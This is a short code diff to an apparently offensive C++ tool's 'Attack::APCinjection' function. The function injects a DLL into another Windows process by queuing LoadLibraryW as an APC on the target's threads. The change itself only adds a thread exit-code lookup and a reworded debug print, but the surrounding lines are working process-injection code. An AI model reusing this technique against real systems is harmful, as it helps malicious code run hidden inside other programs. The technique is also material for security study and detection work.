@@ -211,6 +211,7 @@ BOOL FindProcess(string exeName, DWORD& pid, vector<DWORD>& tids)
 // virtual memory
 BOOL Attack::APCinjection(string target, TCHAR *dll_name)
 {
+	DWORD exit;
 	TCHAR lpdllpath[MAX_PATH];
 	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);
 
@@ -248,9 +249,10 @@ BOOL Attack::APCinjection(string target, TCHAR *dll_name)
 	for (const auto &tid : tids)
 	{
 		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
+		GetExitCodeThread(hThread, &exit);
 		if (hThread)
 		{
-			std::cout << "[*] Found thread at " << hThread << std::endl;
+			printf("[*] Found thread at 0x%.8x : %p\r\n", exit, &hThread);
 			QueueUserAPC(
 				(PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"),
 					"LoadLibraryW"),
